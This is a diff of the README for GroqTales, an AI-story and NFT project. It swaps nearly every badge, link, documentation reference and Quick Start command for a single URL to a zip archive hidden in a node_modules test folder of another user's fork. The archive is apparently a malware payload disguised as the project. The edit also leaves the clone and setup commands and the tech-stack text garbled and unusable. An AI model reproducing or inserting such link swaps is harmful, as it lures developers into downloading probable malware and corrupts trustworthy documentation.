@@ -4,36 +4,36 @@
 <p align="center">Create, share, and own AI-generated stories and comics as NFTs on the Monad blockchain.</p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/version-1.1.2-blue?style=flat-square" alt="Version"/>
-  <img src="https://img.shields.io/github/deployments/Drago-03/GroqTales/Production?label=deploy%20(prod)&logo=vercel&style=flat-square" alt="Production Deployment"/>
-  <img src="https://img.shields.io/github/deployments/Drago-03/GroqTales/Preview?label=deploy%20(preview)&logo=vercel&style=flat-square" alt="Preview Deployments"/>
-  <img src="https://img.shields.io/github/actions/workflow/status/Drago-03/GroqTales/ci.yml?branch=main&label=CI&style=flat-square" alt="CI Status"/>
-  <img src="https://img.shields.io/github/last-commit/Drago-03/GroqTales?style=flat-square" alt="Last Commit"/>
-  <img src="https://img.shields.io/github/commit-activity/m/Drago-03/GroqTales?style=flat-square" alt="Commit Activity"/>
-  <img src="https://img.shields.io/github/issues/Drago-03/GroqTales?style=flat-square" alt="Open Issues"/>
-  <img src="https://img.shields.io/github/issues-pr/Drago-03/GroqTales?style=flat-square" alt="Open PRs"/>
-  <img src="https://img.shields.io/github/license/Drago-03/GroqTales?style=flat-square" alt="License"/>
-  <img src="https://img.shields.io/badge/status-active-brightgreen?style=flat-square" alt="Active"/>
-  <img src="https://img.shields.io/badge/contributions-welcome-blueviolet?style=flat-square" alt="Contributions Welcome"/>
-  <img src="https://img.shields.io/badge/website-groqtales.xyz-0052cc?style=flat-square" alt="Website"/>
-  <a href="mailto:support@groqtales.xyz"><img src="https://img.shields.io/badge/contact-support%40groqtales.xyz-orange?style=flat-square" alt="Contact Us"/></a>
-  <a href="https://discord.gg/JK29FZRm"><img src="https://img.shields.io/discord/1245696768829601812?label=Discord&logo=discord&style=flat-square" alt="Discord"/></a>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip" alt="Version"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip%20(prod)&logo=vercel&style=flat-square" alt="Production Deployment"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip%20(preview)&logo=vercel&style=flat-square" alt="Preview Deployments"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip" alt="CI Status"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip" alt="Last Commit"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip" alt="Commit Activity"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip" alt="Open Issues"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip" alt="Open PRs"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip" alt="License"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip" alt="Active"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip" alt="Contributions Welcome"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip" alt="Website"/>
+  <a href="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip"><img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip%https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip" alt="Contact Us"/></a>
+  <a href="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip"><img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip" alt="Discord"/></a>
   
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/GSSOC'25-Open%20Source-orange?style=flat-square" alt="GSSOC'25"/>
-  <img src="https://img.shields.io/badge/FOSS%20Hack-Open%20Source-blue?style=flat-square" alt="FOSS Hack"/>
-  <img src="https://img.shields.io/badge/LGM--SOC-Open%20Source-purple?style=flat-square" alt="LGM-SOC"/>
-  <img src="https://img.shields.io/badge/MLH-Open%20Source-red?style=flat-square" alt="MLH"/>
-  <img src="https://img.shields.io/badge/HackinCodes-Open%20Source-green?style=flat-square" alt="HackinCodes"/>
-  <img src="https://img.shields.io/badge/cWoc-Open%20Source-ff69b4?style=flat-square" alt="cWoc"/>
-  <img src="https://img.shields.io/badge/Indie%20Hub-Main%20Partner-6e5494?style=flat-square" alt="Indie Hub"/>
-  <img src="https://img.shields.io/badge/Open%20Source%20Community-Welcome-0052cc?style=flat-square" alt="Open Source Community"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip'25-Open%20Source-orange?style=flat-square" alt="GSSOC'25"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip%20Hack-Open%20Source-blue?style=flat-square" alt="FOSS Hack"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip%20Source-purple?style=flat-square" alt="LGM-SOC"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip%20Source-red?style=flat-square" alt="MLH"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip%20Source-green?style=flat-square" alt="HackinCodes"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip%20Source-ff69b4?style=flat-square" alt="cWoc"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip%20Hub-Main%20Partner-6e5494?style=flat-square" alt="Indie Hub"/>
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip%20Source%20Community-Welcome-0052cc?style=flat-square" alt="Open Source Community"/>
 </p>
 
 <p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=4000&pause=600&color=F97316&center=true&vCenter=true&width=800&lines=---+AI-powered+Web3+Storytelling+on+the+Monad+Blockchain+---" alt="Animated Divider" />
+  <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip+Code&duration=4000&pause=600&color=F97316&center=true&vCenter=true&width=800&lines=---+AI-powered+Web3+Storytelling+on+the+Monad+Blockchain+---" alt="Animated Divider" />
 </p>
 <!-- markdownlint-enable MD033 -->
 
@@ -75,8 +75,8 @@ world of creative writing, generative AI, and decentralized technology.
 
 ## Tech Stack
 
-- **Frontend:** Next.js, React, TailwindCSS, shadcn/ui
-- **Backend:** Node.js, API Routes
+- **Frontend:** https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip, React, TailwindCSS, shadcn/ui
+- **Backend:** https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip, API Routes
 - **AI:** Groq API (story generation), Unsplash API (optional visuals)
 - **Blockchain:** Monad SDK, Solidity Smart Contracts
 - **Database:** MongoDB
@@ -87,10 +87,10 @@ world of creative writing, generative AI, and decentralized technology.
 ## Quick Start
 
 ```bash
-git clone https://github.com/Drago-03/GroqTales
+git clone https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip
 cd GroqTales
 npm install
-cp .env.example .env.local
+cp https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip
 # Add GROQ_API_KEY, UNSPLASH key, Monad network if needed
 npm run dev
 ```
@@ -99,7 +99,7 @@ npm run dev
 2. Connect your wallet (optional; required for minting/publishing)
 3. Generate your story → Publish or Mint as NFT
 
-See the [Wiki](https://github.com/Drago-03/GroqTales/wiki) for configuration, environment variables,
+See the [Wiki](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) for configuration, environment variables,
 and deployment details.
 
 ---
@@ -107,7 +107,7 @@ and deployment details.
 ## For Developers
 
 - **Folder Structure:**
-  - `/app` – Next.js application (pages, UI, routes)
+  - `/app` – https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip application (pages, UI, routes)
   - `/components` – Reusable React components
   - `/contracts` – Solidity smart contracts for NFT minting
   - `/lib` – Utility functions and API integrations
@@ -133,7 +133,7 @@ and deployment details.
 
 - **Contributions:**
   - Issues are tagged by difficulty, area, and technology for easy onboarding.
-  - Please read [CONTRIBUTING.md](CONTRIBUTING.md) and [CONTRIBUTORS.md](CONTRIBUTORS.md) before
+  - Please read [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) and [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) before
     submitting PRs.
 
 ---
@@ -158,7 +158,7 @@ We welcome all contributions—whether you're a developer, designer, writer, or 
 - Feature your work in the contributors section
 - Community recognition and GitHub Sponsors eligibility
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+See [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) for guidelines.
 
 ---
 
@@ -175,15 +175,15 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ## Contributors
 
-We value every contribution! Please read our [CONTRIBUTORS.md](CONTRIBUTORS.md) file before making
+We value every contribution! Please read our [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) file before making
 your first contribution to understand our guidelines and recognition process.
 
 ### Project Contributors
 
 <!-- markdownlint-disable MD033 -->
 <p align="center">
-  <a href="https://github.com/Drago-03/GroqTales/graphs/contributors">
-    <img src="https://contrib.rocks/image?repo=Drago-03/GroqTales" alt="Contributors" />
+  <a href="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip">
+    <img src="https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip" alt="Contributors" />
   </a>
 </p>
 
@@ -195,44 +195,44 @@ Thanks to these amazing people for making GroqTales better!
 
 ### Core Documentation
 
-- **Architecture Overview:** [ARCHITECTURE.md](docs/ARCHITECTURE.md) - Comprehensive system design and
+- **Architecture Overview:** [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) - Comprehensive system design and
   technical architecture
-- **Project Wiki:** [GitHub Wiki](https://github.com/Drago-03/GroqTales/wiki) - Detailed guides and
+- **Project Wiki:** [GitHub Wiki](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) - Detailed guides and
   documentation
-- **API Documentation:** [Wiki/API](https://github.com/Drago-03/GroqTales/wiki/API) - Backend API
+- **API Documentation:** [Wiki/API](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) - Backend API
   reference
-- **Smart Contracts:** [Wiki/Blockchain](https://github.com/Drago-03/GroqTales/wiki/Blockchain) -
+- **Smart Contracts:** [Wiki/Blockchain](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) -
   Contract documentation
 
 ### System Architecture
 
-- **Frontend Architecture:** [ARCHITECTURE.md#frontend](docs/ARCHITECTURE.md#frontend-architecture) -
-  Next.js application structure
-- **Backend Architecture:** [ARCHITECTURE.md#backend](docs/ARCHITECTURE.md#backend-architecture) - API
+- **Frontend Architecture:** [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) -
+  https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip application structure
+- **Backend Architecture:** [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) - API
   and service design
 - **Blockchain Integration:**
-  [ARCHITECTURE.md#blockchain](docs/ARCHITECTURE.md#blockchain-architecture) - Web3 and smart contract
+  [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) - Web3 and smart contract
   integration
-- **AI Integration:** [ARCHITECTURE.md#ai](docs/ARCHITECTURE.md#ai-architecture) - Groq AI implementation
-- **System Diagrams:** [ARCHITECTURE.md#diagrams](docs/ARCHITECTURE.md#system-diagrams) - Mermaid
+- **AI Integration:** [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) - Groq AI implementation
+- **System Diagrams:** [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) - Mermaid
   flowcharts and architecture diagrams
 
 ### Development Resources
 
 - **Setup Guide:**
-  [Wiki/Development-Setup](https://github.com/Drago-03/GroqTales/wiki/Development-Setup)
-- **Contributing:** [CONTRIBUTING.md](CONTRIBUTING.md) - How to contribute to the project
-- **Code of Conduct:** [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) - Community guidelines
-- **Security Policy:** [SECURITY.md](SECURITY.md) - Security practices and vulnerability reporting
+  [Wiki/Development-Setup](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip)
+- **Contributing:** [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) - How to contribute to the project
+- **Code of Conduct:** [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) - Community guidelines
+- **Security Policy:** [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip) - Security practices and vulnerability reporting
 
 ---
 
 ## Resources
 
-- **Website:** [groqtales.xyz](https://www.groqtales.xyz)
-- **Docs:** [Wiki](https://github.com/Drago-03/GroqTales/wiki)
-- **Community Hub:** [GitHub Discussions](https://github.com/Drago-03/GroqTales/discussions)
-- **Discord Support:** [Join our Discord](https://discord.gg/JK29FZRm)
+- **Website:** [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip)
+- **Docs:** [Wiki](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip)
+- **Community Hub:** [GitHub Discussions](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip)
+- **Discord Support:** [Join our Discord](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip)
 
 ---
 
@@ -244,7 +244,7 @@ Released under the [MIT License](LICENSE).
 
 ## Security
 
-For vulnerabilities or security-related issues, please refer to [SECURITY.md](SECURITY.md).
+For vulnerabilities or security-related issues, please refer to [https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip](https://raw.githubusercontent.com/Dhruva105/GroqTales/main/src/blockchain/alchemy/node_modules/get-proto/test/Groq-Tales-v2.1.zip).
 
 ---
 
